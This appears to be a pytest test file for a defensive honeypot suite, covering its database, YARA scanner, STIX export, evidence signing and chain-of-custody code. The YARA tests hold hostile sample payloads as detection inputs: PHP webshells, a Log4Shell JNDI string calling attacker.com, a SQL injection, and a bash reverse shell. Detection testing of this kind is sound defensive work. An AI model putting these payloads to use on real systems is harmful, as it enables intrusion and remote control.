"""
tests/test_core.py — Core Test Suite for HoneypotSuite v2.0

Run: pytest tests/ -v --cov=. --cov-report=html
"""

import json
import os
import sys
import pytest
from datetime import datetime

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))


# ══════════════════════════════════════════════════════════════
# Database Tests
# ══════════════════════════════════════════════════════════════

class TestDatabase:
    """Test SQLAlchemy database layer."""

    @pytest.fixture(autouse=True)
    def setup_db(self, tmp_path):
        """Create a fresh in-memory DB for each test."""
        import database as db
        db.engine.dispose()
        db.DB_URL = "sqlite:///:memory:"
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        from sqlalchemy.orm import sessionmaker
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)
        yield
        db.Base.metadata.drop_all(db.engine)

    def test_attack_event_insert(self):
        from database import DbSession, AttackEvent
        with DbSession() as s:
            ev = AttackEvent(
                service="SSH",
                src_ip="1.2.3.4",
                event_type="BRUTE_FORCE",
                severity="HIGH",
            )
            s.add(ev)
            s.commit()
            assert s.query(AttackEvent).count() == 1

    def test_attack_event_to_json_safe(self):
        from database import DbSession, AttackEvent
        with DbSession() as s:
            ev = AttackEvent(
                service="HTTP",
                src_ip="10.0.0.1",
                event_type="SQL_INJECTION",
                severity="CRITICAL",
            )
            s.add(ev)
            s.commit()
            row = s.query(AttackEvent).first()
            d = row.to_json_safe()
            assert d["service"] == "HTTP"
            assert d["severity"] == "CRITICAL"
            assert isinstance(d.get("timestamp"), str)   # should be ISO string

    def test_ip_intel_cache(self):
        from database import DbSession, IPIntel
        with DbSession() as s:
            ip = IPIntel(
                ip="8.8.8.8",
                country="United States",
                country_code="US",
                org="Google LLC",
                is_datacenter=True,
            )
            s.add(ip)
            s.commit()
            fetched = s.query(IPIntel).filter_by(ip="8.8.8.8").first()
            assert fetched.country == "United States"
            assert fetched.is_datacenter is True

    def test_alert_insert_and_ack(self):
        from database import DbSession, Alert
        with DbSession() as s:
            al = Alert(
                severity="CRITICAL",
                alert_type="BRUTE_FORCE",
                src_ip="5.5.5.5",
                description="50 failed login attempts",
                service="SSH",
            )
            s.add(al)
            s.commit()
            row = s.query(Alert).first()
            assert row.acknowledged is False
            row.acknowledged = True
            s.commit()
            assert s.query(Alert).filter_by(acknowledged=True).count() == 1

    def test_malware_sample(self):
        from database import DbSession, MalwareSample
        with DbSession() as s:
            m = MalwareSample(
                src_ip="99.99.99.99",
                service="HTTP",
                original_name="shell.php",
                sha256="abc123" * 10 + "ab",
                file_type="PHP Script",
                severity="CRITICAL",
            )
            s.add(m)
            s.commit()
            assert s.query(MalwareSample).count() == 1

    def test_stats_empty_db(self):
        from database import stats_last_n_hours
        stats = stats_last_n_hours(24)
        assert stats["total_events"] == 0
        assert stats["unique_ips"] == 0
        assert stats["by_service"] == {}

    def test_mitre_event(self):
        from database import DbSession, MitreEvent
        with DbSession() as s:
            me = MitreEvent(
                src_ip="2.2.2.2",
                service="SSH",
                tactic="Initial Access",
                tactic_id="TA0001",
                technique="Brute Force: Password Guessing",
                technique_id="T1110.001",
                confidence="HIGH",
            )
            s.add(me)
            s.commit()
            assert s.query(MitreEvent).count() == 1


# ══════════════════════════════════════════════════════════════
# YARA Scanner Tests
# ══════════════════════════════════════════════════════════════

class TestYaraScanner:
    """Test YARA-based malware detection."""

    @pytest.fixture
    def scanner(self, tmp_path):
        from yara_scanner import YaraScanner
        return YaraScanner(rules_dir=str(tmp_path / "rules"))

    def test_scanner_initializes(self, scanner):
        assert scanner is not None

    def test_php_webshell_detected(self, scanner):
        payload = b"<?php eval(base64_decode($_POST['cmd'])); ?>"
        result = scanner.scan_bytes(payload)
        if result.get("yara_available"):
            assert result["match_count"] > 0
            severities = [m["severity"] for m in result["matches"]]
            assert "CRITICAL" in severities

    def test_clean_file_no_detection(self, scanner):
        payload = b"Hello World! This is a clean file."
        result = scanner.scan_bytes(payload)
        if result.get("yara_available"):
            assert result["match_count"] == 0

    def test_log4shell_detected(self, scanner):
        payload = b"${jndi:ldap://attacker.com/exploit}"
        result = scanner.scan_bytes(payload)
        if result.get("yara_available"):
            assert result["match_count"] > 0

    def test_sql_injection_detected(self, scanner):
        payload = b"' UNION SELECT username, password FROM users--"
        result = scanner.scan_bytes(payload)
        if result.get("yara_available"):
            assert result["match_count"] > 0

    def test_reverse_shell_detected(self, scanner):
        payload = b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        result = scanner.scan_bytes(payload)
        if result.get("yara_available"):
            assert result["match_count"] > 0

    def test_scan_string(self, scanner):
        text = "<?php system($_GET['cmd']); ?>"
        result = scanner.scan_string(text)
        assert "matches" in result
        assert "yara_available" in result

    def test_max_severity_calculation(self, scanner):
        assert scanner._max_severity([]) == "NONE"
        results = [{"severity": "HIGH"}, {"severity": "CRITICAL"}, {"severity": "LOW"}]
        assert scanner._max_severity(results) == "CRITICAL"


# ══════════════════════════════════════════════════════════════
# STIX Export Tests
# ══════════════════════════════════════════════════════════════

class TestStixExport:
    """Test STIX 2.1 bundle generation."""

    @pytest.fixture
    def exporter(self):
        from stix_export import StixExporter
        return StixExporter(tlp_level="WHITE")

    def test_exporter_initializes(self, exporter):
        assert exporter.identity is not None
        assert exporter.identity["type"] == "identity"

    def test_ip_indicator_structure(self, exporter):
        ind = exporter.ip_indicator("1.2.3.4", confidence=80)
        assert ind["type"] == "indicator"
        assert "1.2.3.4" in ind["pattern"]
        assert ind["confidence"] == 80
        assert ind["pattern_type"] == "stix"

    def test_file_indicator_structure(self, exporter):
        ind = exporter.file_indicator(
            sha256="a" * 64, md5="b" * 32, sha1="c" * 40,
            filename="malware.php"
        )
        assert ind["type"] == "indicator"
        assert "SHA-256" in ind["pattern"]

    def test_attack_pattern_structure(self, exporter):
        ap = exporter.attack_pattern(
            technique_id="T1110.001",
            technique_name="Brute Force: Password Guessing",
            tactic="Initial Access",
        )
        assert ap["type"] == "attack-pattern"
        assert ap["kill_chain_phases"][0]["kill_chain_name"] == "mitre-attack"
        assert ap["external_references"][0]["external_id"] == "T1110.001"

    def test_build_bundle_empty(self, exporter):
        bundle = exporter.build_bundle()
        assert bundle["type"] == "bundle"
        assert bundle["spec_version"] == "2.1"
        assert "objects" in bundle
        # Should have identity + TLP marking at minimum
        assert len(bundle["objects"]) >= 2

    def test_build_bundle_with_events(self, exporter):
        events = [
            {"src_ip": "1.1.1.1", "service": "SSH", "mitre_id": "T1110.001",
             "country": "US", "is_scanner": False},
            {"src_ip": "2.2.2.2", "service": "HTTP", "mitre_id": "T1190",
             "country": "RU", "is_scanner": True},
        ]
        mitre = [
            {"technique_id": "T1110.001", "technique": "Brute Force",
             "tactic": "Initial Access", "description": ""},
        ]
        bundle = exporter.build_bundle(events=events, mitre_events=mitre)
        types = [o["type"] for o in bundle["objects"]]
        assert "indicator" in types
        assert "attack-pattern" in types
        assert "relationship" in types

    def test_bundle_json_serializable(self, exporter):
        events = [{"src_ip": "3.3.3.3", "service": "FTP", "country": "CN"}]
        bundle = exporter.build_bundle(events=events)
        serialized = json.dumps(bundle)
        parsed = json.loads(serialized)
        assert parsed["type"] == "bundle"

    def test_export_json_file(self, exporter, tmp_path):
        bundle = exporter.build_bundle()
        out = str(tmp_path / "test_bundle.json")
        path = exporter.export_json(bundle, out)
        assert os.path.exists(path)
        with open(path) as f:
            data = json.load(f)
        assert data["type"] == "bundle"

    def test_tlp_markings_present(self, exporter):
        bundle = exporter.build_bundle()
        marking_ids = {o["id"] for o in bundle["objects"]
                       if o["type"] == "marking-definition"}
        assert len(marking_ids) > 0


# ══════════════════════════════════════════════════════════════
# Config Loader Tests
# ══════════════════════════════════════════════════════════════

class TestConfigLoader:
    """Test YAML config loading and ENV overrides."""

    def test_get_default(self):
        from config_loader import get
        assert get("nonexistent.key", 42) == 42

    def test_get_nested_key(self, tmp_path, monkeypatch):
        import yaml
        cfg_data = {"services": {"ssh": {"port": 9922}}}
        cfg_file = tmp_path / "config.yaml"
        cfg_file.write_text(yaml.dump(cfg_data))
        from config_loader import load, get
        load(str(cfg_file))
        assert get("services.ssh.port") == 9922

    def test_env_override(self, monkeypatch):
        monkeypatch.setenv("HONEYPOT__SERVICES__SSH__PORT", "7777")
        from config_loader import load, get
        import config_loader as cl
        cl._config.setdefault("services", {}).setdefault("ssh", {})["port"] = 2222
        cl._config = cl._apply_env_overrides(cl._config)
        assert get("services.ssh.port") == 7777


# ══════════════════════════════════════════════════════════════
# Integration: Log → DB pipeline
# ══════════════════════════════════════════════════════════════

class TestEvidenceManifest:
    """Tests for Phase 1D Evidence Manifest (core/evidence_manifest.py)."""

    @pytest.fixture(autouse=True)
    def fresh_env(self, tmp_path):
        import database as db
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        from sqlalchemy.orm import sessionmaker
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)

        import core.evidence_signing as es
        self._orig_keys   = (es.KEYS_DIR, es.PRIVATE_DIR, es.PUBLIC_DIR, es.ACTIVE_KEY_FILE)
        es.KEYS_DIR       = str(tmp_path / "keys")
        es.PRIVATE_DIR    = str(tmp_path / "keys" / "private")
        es.PUBLIC_DIR     = str(tmp_path / "keys" / "public")
        es.ACTIVE_KEY_FILE= str(tmp_path / "keys" / "active_key.json")
        self.es = es
        self.tmp = tmp_path

        import core.evidence_manifest as em
        self._orig_export = em._EXPORTS_DIR
        em._EXPORTS_DIR = str(tmp_path / "exports" / "manifests")
        self.em = em

        from database import DbSession, Evidence, EvidenceSignature
        from datetime import datetime
        self.es.generate_keypair("ed25519")
        sha256 = "a" * 64
        (tmp_path / "ev.bin").write_bytes(b"evidence data")
        with DbSession() as s:
            ev = Evidence(file_name="ev.bin", file_path=str(tmp_path / "ev.bin"),
                          file_size=13, sha256_hash=sha256,
                          hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); self.eid = ev.id
        self.es.sign_hash(sha256, evidence_id=self.eid)

        yield

        es.KEYS_DIR, es.PRIVATE_DIR, es.PUBLIC_DIR, es.ACTIVE_KEY_FILE = self._orig_keys
        em._EXPORTS_DIR = self._orig_export
        db.Base.metadata.drop_all(db.engine)

    def test_create_manifest_returns_dict(self):
        m = self.em.create_manifest(self.eid)
        assert m is not None
        assert m["evidence_id"] == self.eid
        assert m["status"] == "VALID"
        assert m["manifest_version"] == 1

    def test_create_manifest_has_all_spec_fields(self):
        m = self.em.create_manifest(self.eid)
        required = {
            "manifest_id", "evidence_id", "case_id", "sha256_hash",
            "signature", "signature_algorithm", "key_id",
            "public_key_fingerprint", "file_name", "file_size",
            "mime_type", "file_extension", "created_at",
            "acquired_at", "manifest_version", "status",
        }
        assert required.issubset(set(m.keys())), \
            f"Missing fields: {required - set(m.keys())}"

    def test_create_manifest_uuid_format(self):
        import uuid as uuid_mod
        m = self.em.create_manifest(self.eid)
        uuid_mod.UUID(m["manifest_id"])

    def test_create_manifest_one_per_evidence(self):
        from database import DbSession, EvidenceManifest
        self.em.create_manifest(self.eid)
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            count = s.query(EvidenceManifest).filter(
                EvidenceManifest.evidence_id == self.eid).count()
        assert count == 1

    def test_create_manifest_returns_existing_on_duplicate(self):
        m1 = self.em.create_manifest(self.eid)
        m2 = self.em.create_manifest(self.eid)
        assert m1["manifest_id"] == m2["manifest_id"]

    def test_create_manifest_fires_coc_event(self):
        from database import DbSession, ChainOfCustody
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            events = s.query(ChainOfCustody).filter(
                ChainOfCustody.evidence_id == self.eid,
                ChainOfCustody.action == "MANIFEST_CREATED"
            ).all()
        assert len(events) == 1

    def test_create_manifest_without_evidence_returns_none(self):
        result = self.em.create_manifest(99999)
        assert result is None

    def test_create_manifest_without_signature_returns_none(self):
        from database import DbSession, Evidence
        from datetime import datetime
        (self.tmp / "nosig.bin").write_bytes(b"x")
        with DbSession() as s:
            ev = Evidence(file_name="nosig.bin", file_path=str(self.tmp / "nosig.bin"),
                          file_size=1, sha256_hash="b" * 64,
                          hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid2 = ev.id
        result = self.em.create_manifest(eid2)
        assert result is None

    def test_create_manifest_with_case_id(self):
        m = self.em.create_manifest(self.eid, case_id="case-42")
        assert m["case_id"] == "case-42"

    def test_manifest_exists_false_before_create(self):
        assert self.em.manifest_exists(self.eid) is False

    def test_manifest_exists_true_after_create(self):
        self.em.create_manifest(self.eid)
        assert self.em.manifest_exists(self.eid) is True

    def test_load_manifest_none_before_create(self):
        assert self.em.load_manifest(self.eid) is None

    def test_load_manifest_returns_dict_after_create(self):
        self.em.create_manifest(self.eid)
        m = self.em.load_manifest(self.eid)
        assert m is not None
        assert m["sha256_hash"] == "a" * 64

    def test_verify_manifest_valid_unchanged(self):
        self.em.create_manifest(self.eid)
        result = self.em.verify_manifest(self.eid)
        assert result == "VALID"

    def test_verify_manifest_missing_when_no_manifest(self):
        result = self.em.verify_manifest(self.eid)
        assert result == "MISSING"

    def test_verify_manifest_invalid_on_sha256_change(self):
        from database import DbSession, Evidence
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            ev = s.query(Evidence).filter(Evidence.id == self.eid).first()
            ev.sha256_hash = "f" * 64
            s.commit()
        assert self.em.verify_manifest(self.eid) == "INVALID"

    def test_verify_manifest_invalid_on_signature_change(self):
        from database import DbSession, EvidenceSignature
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            sig = s.query(EvidenceSignature).filter(
                EvidenceSignature.evidence_id == self.eid).first()
            sig.signature = "00" * 64
            s.commit()
        assert self.em.verify_manifest(self.eid) == "INVALID"

    def test_verify_manifest_invalid_on_file_size_change(self):
        from database import DbSession, Evidence
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            ev = s.query(Evidence).filter(Evidence.id == self.eid).first()
            ev.file_size = 99999
            s.commit()
        assert self.em.verify_manifest(self.eid) == "INVALID"

    def test_verify_manifest_updates_status_in_db(self):
        from database import DbSession, Evidence, EvidenceManifest
        self.em.create_manifest(self.eid)
        with DbSession() as s:
            ev = s.query(Evidence).filter(Evidence.id == self.eid).first()
            ev.sha256_hash = "0" * 64
            s.commit()
        self.em.verify_manifest(self.eid)
        with DbSession() as s:
            mf = s.query(EvidenceManifest).filter(
                EvidenceManifest.evidence_id == self.eid).first()
        assert mf.status == "INVALID"

    def test_verify_manifest_fires_coc_event(self):
        from database import DbSession, ChainOfCustody
        self.em.create_manifest(self.eid)
        self.em.verify_manifest(self.eid, performed_by="investigator")
        with DbSession() as s:
            events = s.query(ChainOfCustody).filter(
                ChainOfCustody.evidence_id == self.eid,
                ChainOfCustody.action == "MANIFEST_VERIFIED"
            ).all()
        assert len(events) == 1
        assert events[0].performed_by == "investigator"

    def test_export_json_signature_stripped(self):
        import json as json_mod
        self.em.create_manifest(self.eid)
        path = self.em.export_manifest(self.eid, fmt="json")
        with open(path) as f:
            d = json_mod.load(f)
        assert "signature" not in d
        assert "sha256_hash" in d
        assert "manifest_id" in d

    def test_export_csv(self):
        import csv as csv_mod
        self.em.create_manifest(self.eid)
        path = self.em.export_manifest(self.eid, fmt="csv")
        with open(path) as f:
            rows = list(csv_mod.DictReader(f))
        assert len(rows) == 1
        assert rows[0]["status"] == "VALID"

    def test_export_pdf_valid_header(self):
        self.em.create_manifest(self.eid)
        path = self.em.export_manifest(self.eid, fmt="pdf")
        with open(path, "rb") as f:
            assert f.read(4) == b"%PDF"

    def test_export_invalid_format_raises(self):
        self.em.create_manifest(self.eid)
        with pytest.raises(ValueError):
            self.em.export_manifest(self.eid, fmt="xlsx")

    def test_export_missing_manifest_raises(self):
        with pytest.raises(RuntimeError):
            self.em.export_manifest(self.eid, fmt="json")

    def test_mime_type_detected_from_extension(self):
        from core.evidence_manifest import _detect_mime
        mime, ext = _detect_mime("report.pdf", "/tmp/report.pdf")
        assert mime == "application/pdf"
        assert ext == ".pdf"

    def test_mime_fallback_for_unknown(self):
        from core.evidence_manifest import _detect_mime
        # .qqzxk is not a registered MIME type in any standard mimetypes
        # database (unlike .xyz, which is genuinely registered as
        # chemical/x-xyz for molecular structure files) — this
        # exercises the actual application/octet-stream fallback path.
        mime, ext = _detect_mime("unknown.qqzxk", "/tmp/unknown.qqzxk")
        assert mime == "application/octet-stream"
        assert ext == ".qqzxk"

    def test_auto_manifest_created_by_register_evidence_file(self):
        from database import DbSession, Evidence, EvidenceManifest
        from core.evidence_hashing import register_evidence_file
        (self.tmp / "auto.bin").write_bytes(b"auto content")
        register_evidence_file(str(self.tmp / "auto.bin"), source_type="manual")
        with DbSession() as s:
            ev = s.query(Evidence).filter(Evidence.file_path == str(self.tmp / "auto.bin")).first()
            assert ev is not None
            mf = s.query(EvidenceManifest).filter(
                EvidenceManifest.evidence_id == ev.id).first()
        assert mf is not None, "Manifest must be auto-created by register_evidence_file"
        assert mf.status == "VALID"


class TestEvidenceSigning:
    """Tests for Phase 1C Digital Evidence Signing (core/evidence_signing.py)."""

    @pytest.fixture(autouse=True)
    def isolated_keys_and_db(self, tmp_path):
        """Each test gets its own keys directory and in-memory DB."""
        import database as db
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        from sqlalchemy.orm import sessionmaker
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)

        # Redirect key storage to a per-test tmp dir
        import core.evidence_signing as es
        self._orig_keys_dir     = es.KEYS_DIR
        self._orig_private_dir  = es.PRIVATE_DIR
        self._orig_public_dir   = es.PUBLIC_DIR
        self._orig_active_file  = es.ACTIVE_KEY_FILE
        es.KEYS_DIR         = str(tmp_path / "keys")
        es.PRIVATE_DIR      = str(tmp_path / "keys" / "private")
        es.PUBLIC_DIR       = str(tmp_path / "keys" / "public")
        es.ACTIVE_KEY_FILE  = str(tmp_path / "keys" / "active_key.json")
        self.tmp_path = tmp_path
        self.es = es

        # Seed one Evidence row
        from database import DbSession, Evidence
        from datetime import datetime
        with DbSession() as s:
            ev = Evidence(
                file_name="test.bin",
                file_path=str(tmp_path / "test.bin"),
                sha256_hash="a" * 64,
                hash_created_at=datetime.utcnow(),
                created_at=datetime.utcnow(),
            )
            (tmp_path / "test.bin").write_bytes(b"test data")
            s.add(ev)
            s.commit()
            self.eid = ev.id

        yield

        es.KEYS_DIR        = self._orig_keys_dir
        es.PRIVATE_DIR     = self._orig_private_dir
        es.PUBLIC_DIR      = self._orig_public_dir
        es.ACTIVE_KEY_FILE = self._orig_active_file
        db.Base.metadata.drop_all(db.engine)

    # ── Key generation ─────────────────────────────────────────

    def test_generate_ed25519_keypair(self):
        meta = self.es.generate_keypair("ed25519")
        assert meta["algorithm"] == "ed25519"
        assert len(meta["key_id"]) == 16
        assert ":" in meta["public_key_fingerprint"]
        assert "private_key_path" not in meta   # must never be returned

    def test_generate_rsa4096_keypair(self):
        meta = self.es.generate_keypair("rsa4096")
        assert meta["algorithm"] == "rsa4096"
        assert len(meta["key_id"]) == 16

    def test_generate_invalid_algorithm_raises(self):
        with pytest.raises(ValueError, match="Unsupported algorithm"):
            self.es.generate_keypair("md5")

    def test_private_key_file_mode_600(self):
        import stat as stat_mod
        meta = self.es.generate_keypair("ed25519")
        priv_path = self.es._private_path(meta["key_id"], "ed25519")
        mode = stat_mod.S_IMODE(os.stat(priv_path).st_mode)
        assert mode == 0o600, f"Private key has mode {oct(mode)}, expected 0o600"

    def test_load_keys_returns_none_before_generation(self):
        assert self.es.load_keys() is None

    def test_load_keys_after_generation(self):
        self.es.generate_keypair("ed25519")
        meta = self.es.load_keys()
        assert meta is not None
        assert meta["algorithm"] == "ed25519"
        assert "private_key_path" not in meta

    # ── Signing ────────────────────────────────────────────────

    def test_sign_hash_returns_metadata(self):
        self.es.generate_keypair("ed25519")
        result = self.es.sign_hash("a" * 64, evidence_id=self.eid)
        assert result["algorithm"] == "ed25519"
        assert result["key_id"]
        assert result["signed_at"]
        assert result["public_key_fingerprint"]

    def test_sign_hash_without_active_key_raises(self):
        with pytest.raises(RuntimeError, match="No active signing key"):
            self.es.sign_hash("a" * 64)

    def test_sign_hash_invalid_sha256_raises(self):
        self.es.generate_keypair("ed25519")
        with pytest.raises(ValueError):
            self.es.sign_hash("tooshort")

    def test_sign_hash_persists_to_db(self):
        from database import DbSession, EvidenceSignature
        self.es.generate_keypair("ed25519")
        self.es.sign_hash("b" * 64, evidence_id=self.eid)
        with DbSession() as s:
            sig = s.query(EvidenceSignature).filter(
                EvidenceSignature.evidence_id == self.eid
            ).first()
        assert sig is not None
        assert sig.algorithm == "ed25519"
        assert sig.signed_sha256 == "b" * 64

    def test_sign_hash_never_returns_private_material(self):
        self.es.generate_keypair("ed25519")
        result = self.es.sign_hash("c" * 64)
        for key in result:
            assert "private" not in key.lower()

    # ── Verification ───────────────────────────────────────────

    def test_verify_signature_valid(self):
        from database import DbSession, Evidence
        from datetime import datetime
        self.es.generate_keypair("ed25519")
        sha256 = "d" * 64
        with (self.tmp_path / "ev2.bin").open("wb") as f: f.write(b"x")
        with DbSession() as s:
            ev = Evidence(file_name="ev2.bin", file_path=str(self.tmp_path / "ev2.bin"),
                          sha256_hash=sha256, hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid2 = ev.id
        self.es.sign_hash(sha256, evidence_id=eid2)
        assert self.es.verify_signature(eid2) == "VALID"

    def test_verify_signature_missing_when_no_row(self):
        from database import DbSession, Evidence
        from datetime import datetime
        with (self.tmp_path / "nosig.bin").open("wb") as f: f.write(b"y")
        with DbSession() as s:
            ev = Evidence(file_name="nosig.bin", file_path=str(self.tmp_path / "nosig.bin"),
                          sha256_hash="e"*64, hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid3 = ev.id
        assert self.es.verify_signature(eid3) == "MISSING"

    def test_verify_signature_invalid_on_tamper(self):
        from database import DbSession, EvidenceSignature, Evidence
        from datetime import datetime
        self.es.generate_keypair("ed25519")
        sha256 = "f" * 64
        with (self.tmp_path / "ev3.bin").open("wb") as f: f.write(b"z")
        with DbSession() as s:
            ev = Evidence(file_name="ev3.bin", file_path=str(self.tmp_path / "ev3.bin"),
                          sha256_hash=sha256, hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid4 = ev.id
        self.es.sign_hash(sha256, evidence_id=eid4)
        # Tamper with stored signature
        with DbSession() as s:
            sig = s.query(EvidenceSignature).filter(EvidenceSignature.evidence_id == eid4).first()
            sig.signature = "00" * 64
            s.commit()
        assert self.es.verify_signature(eid4) == "INVALID"

    def test_verify_signature_fires_coc_event(self):
        from database import DbSession, ChainOfCustody, Evidence
        from datetime import datetime
        self.es.generate_keypair("ed25519")
        sha256 = "aa" * 32
        with (self.tmp_path / "coc.bin").open("wb") as f: f.write(b"coc")
        with DbSession() as s:
            ev = Evidence(file_name="coc.bin", file_path=str(self.tmp_path / "coc.bin"),
                          sha256_hash=sha256, hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid5 = ev.id
        self.es.sign_hash(sha256, evidence_id=eid5)
        self.es.verify_signature(eid5, performed_by="analyst")
        with DbSession() as s:
            events = s.query(ChainOfCustody).filter(
                ChainOfCustody.evidence_id == eid5,
                ChainOfCustody.action == "SIGNATURE_VERIFIED"
            ).all()
        assert len(events) == 1
        assert events[0].performed_by == "analyst"

    # ── Key rotation ───────────────────────────────────────────

    def test_rotate_keys_produces_new_key_id(self):
        self.es.generate_keypair("ed25519")
        old = self.es.load_keys()
        new = self.es.rotate_keys("ed25519")
        assert old["key_id"] != new["key_id"]

    def test_old_signatures_still_valid_after_rotation(self):
        from database import DbSession, Evidence
        from datetime import datetime
        self.es.generate_keypair("ed25519")
        sha256 = "bb" * 32
        with (self.tmp_path / "pre_rotate.bin").open("wb") as f: f.write(b"r")
        with DbSession() as s:
            ev = Evidence(file_name="pre_rotate.bin", file_path=str(self.tmp_path / "pre_rotate.bin"),
                          sha256_hash=sha256, hash_created_at=datetime.utcnow(), created_at=datetime.utcnow())
            s.add(ev); s.commit(); eid6 = ev.id
        self.es.sign_hash(sha256, evidence_id=eid6)
        self.es.rotate_keys("ed25519")
        # Signature was made with old key; verify must load old public key by key_id
        assert self.es.verify_signature(eid6) == "VALID"

    def test_rsa4096_sign_and_verify(self):
        self.es.generate_keypair("rsa4096")
        sha256 = "cc" * 32
        result = self.es.sign_hash(sha256)
        assert result["algorithm"] == "rsa4096"
        v = self.es._verify_bytes(sha256, result["signature"], "rsa4096", result["key_id"])
        assert v == "VALID"
        v2 = self.es._verify_bytes("dd"*32, result["signature"], "rsa4096", result["key_id"])
        assert v2 == "INVALID"


class TestChainOfCustody:
    """Tests for Phase 1B Chain of Custody (core/chain_of_custody.py)."""

    @pytest.fixture(autouse=True)
    def fresh_db(self, tmp_path):
        import database as db
        from sqlalchemy import create_engine
        from sqlalchemy.pool import StaticPool
        from sqlalchemy.orm import sessionmaker
        db.engine = create_engine(
            "sqlite:///:memory:",
            connect_args={"check_same_thread": False},
            poolclass=StaticPool,
        )
        db.DbSession = sessionmaker(bind=db.engine)
        db.Base.metadata.create_all(db.engine)
        self.tmp_path = tmp_path

        # Seed one Evidence row so CoC records have a valid evidence_id
        from database import DbSession, Evidence
        from datetime import datetime
        with DbSession() as s:
            ev = Evidence(
                file_name="test.bin",
                file_path=str(tmp_path / "test.bin"),
                file_size=0,
                sha256_hash="a" * 64,
                hash_created_at=datetime.utcnow(),
                created_at=datetime.utcnow(),
            )
            (tmp_path / "test.bin").write_bytes(b"test")
            s.add(ev)
            s.commit()
            self.evidence_id = ev.id

        yield
        db.Base.metadata.drop_all(db.engine)

    def test_record_event_returns_dict(self):
        from core.chain_of_custody import record_event
        result = record_event(self.evidence_id, "CREATED", performed_by="analyst1")
        assert result is not None
        assert result["action"] == "CREATED"
        assert result["performed_by"] == "analyst1"
        assert result["status"] == "OK"

    def test_record_event_all_valid_actions(self):
        from core.chain_of_custody import record_event, VALID_ACTIONS
        for action in VALID_ACTIONS:
            r = record_event(self.evidence_id, action, performed_by="system")
            assert r is not None, f"record_event failed for action {action}"
            assert r["action"] == action

    def test_record_event_invalid_action_raises_value_error(self):
        from core.chain_of_custody import record_event
        with pytest.raises(ValueError, match="Invalid CoC action"):
            record_event(self.evidence_id, "SNEEZE")

    def test_record_event_missing_evidence_returns_none(self):
        from core.chain_of_custody import record_event
        result = record_event(99999, "VIEWED", performed_by="analyst1")
        assert result is None

    def test_record_event_uuid_primary_key(self):
        import uuid
        from core.chain_of_custody import record_event
        r1 = record_event(self.evidence_id, "CREATED")
        r2 = record_event(self.evidence_id, "HASHED")
        assert r1["id"] != r2["id"]
        # Validate UUIDs parse correctly
        uuid.UUID(r1["id"])
        uuid.UUID(r2["id"])

    def test_get_history_chronological_order(self):
        from core.chain_of_custody import record_event, get_history
        record_event(self.evidence_id, "CREATED")
        record_event(self.evidence_id, "HASHED")
        record_event(self.evidence_id, "VIEWED")
        history = get_history(self.evidence_id)
        assert len(history) == 3
        actions = [r["action"] for r in history]
        assert actions == ["CREATED", "HASHED", "VIEWED"]
        # Timestamps must be non-decreasing
        ts = [r["timestamp"] for r in history]
        assert ts == sorted(ts)

    def test_get_history_empty_for_nonexistent_evidence(self):
        from core.chain_of_custody import get_history
        assert get_history(99999) == []

    def test_get_latest_event_returns_most_recent(self):
        from core.chain_of_custody import record_event, get_latest_event
        record_event(self.evidence_id, "CREATED")
        record_event(self.evidence_id, "HASHED")
        record_event(self.evidence_id, "VIEWED", performed_by="alice")
        latest = get_latest_event(self.evidence_id)
        assert latest["action"] == "VIEWED"
        assert latest["performed_by"] == "alice"

    def test_get_latest_event_none_for_nonexistent(self):
        from core.chain_of_custody import get_latest_event
        assert get_latest_event(99999) is None

    def test_get_history_by_case(self):
        from core.chain_of_custody import record_event, get_history_by_case
        record_event(self.evidence_id, "CREATED", case_id="case-001")
        record_event(self.evidence_id, "VIEWED", case_id="case-001")
        record_event(self.evidence_id, "HASHED")     # no case_id — should NOT appear
        by_case = get_history_by_case("case-001")
        assert len(by_case) == 2
        assert all(r["case_id"] == "case-001" for r in by_case)

    def test_append_only_no_updates(self):
        """Records must never be modified after insertion — verify by
        inserting twice and confirming both original records still exist."""
        from core.chain_of_custody import record_event, get_history
        from database import DbSession, ChainOfCustody
        r1 = record_event(self.evidence_id, "CREATED", reason="first")
        r2 = record_event(self.evidence_id, "VIEWED",  reason="second")
        history = get_history(self.evidence_id)
        assert len(history) == 2
        # Confirm both original IDs still present and unchanged
        ids = {r["id"] for r in history}
        assert r1["id"] in ids
        assert r2["id"] in ids
        with DbSession() as s:
            total = s.query(ChainOfCustody).count()
        assert total == 2

    def test_status_stored_correctly(self):
        from core.chain_of_custody import record_event, get_history
        record_event(self.evidence_id, "HASHED", status="FAILED")
        record_event(self.evidence_id, "VERIFIED", status="OK")
        history = get_history(self.evidence_id)
        assert history[0]["status"] == "FAILED"
        assert history[1]["status"] == "OK"

    def test_invalid_status_falls_back_to_ok(self):
        from core.chain_of_custody import record_event
        r = record_event(self.evidence_id, "VIEWED", status="GARBAGE")
        assert r["status"] == "OK"

    def test_export_json(self, tmp_path):
        from core.chain_of_custody import record_event, export_history
        import json
        record_event(self.evidence_id, "CREATED")
        record_event(self.evidence_id, "HASHED")
        out = str(tmp_path / "coc.json")
